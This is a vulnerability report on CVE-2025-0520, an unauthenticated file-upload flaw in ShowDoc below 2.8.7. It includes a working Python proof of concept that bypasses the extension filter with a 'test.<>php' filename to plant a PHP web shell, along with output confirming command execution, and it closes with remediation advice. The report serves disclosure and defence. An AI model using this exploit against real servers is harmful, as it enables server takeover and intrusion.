# CVE-2025-0520 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-0520
- **CWE ID**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Affected Software**: ShowDoc < 2.8.7
- **Severity**: Critical (CVSS 9.4)

## Description

An unrestricted file upload vulnerability in ShowDoc caused by improper validation of file extension allows execution of arbitrary PHP, leading to remote code execution.

## Root Cause Analysis

The vulnerability exists in the image upload functionality at `/index.php?s=/home/page/uploadImg`. The application fails to properly validate file extensions, allowing attackers to bypass the filter by using special characters in the filename (e.g., `test.<>php`).

The vulnerable code does not implement proper file extension validation, allowing arbitrary file types to be uploaded and executed on the server.

## Exploitation Steps

1. Send a POST request to `/index.php?s=/home/page/uploadImg`
2. Use multipart/form-data with a filename containing `.<>php` extension
3. Include PHP code in the file content
4. The server saves the file with `.php` extension
5. Access the uploaded file URL to execute arbitrary PHP code

## Proof of Concept

```python
import requests

target = "http://localhost:8081"
filename = "test.<>php"
php_code = "<?php echo shell_exec('id'); ?>"

boundary = "----WebKitFormBoundary1234567890"
headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}"
}

body = f"""--{boundary}
Content-Disposition: form-data; name="editormd-image-file"; filename="{filename}"
Content-Type: text/plain

{php_code}
--{boundary}--"""

resp = requests.post(f"{target}/index.php?s=/home/page/uploadImg", headers=headers, data=body)
print(resp.json())
```

## Verification Result

```
[*] Target: http://localhost:8081
[*] Uploading malicious PHP file...
[+] Upload success!
[+] Webshell URL: http://localhost:8081/Public/Uploads/2026-02-03/69820bdc8f2bd.php
[+] RCE verified! Response:
CVE-2025-0520-VULNuid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Vulnerability confirmed: CVE-2025-0520
```

## Impact

- **Remote Code Execution**: Attackers can execute arbitrary commands on the server
- **No Authentication Required**: The vulnerability can be exploited without authentication
- **Complete System Compromise**: Full control over the web server

## Remediation

1. Upgrade ShowDoc to version 2.8.7 or later
2. Implement strict file extension validation using whitelist approach
3. Disable PHP execution in upload directories
4. Deploy WAF rules to block suspicious file uploads

## References

- https://github.com/star7th/showdoc
- https://nvd.nist.gov/vuln/detail/CVE-2025-0520
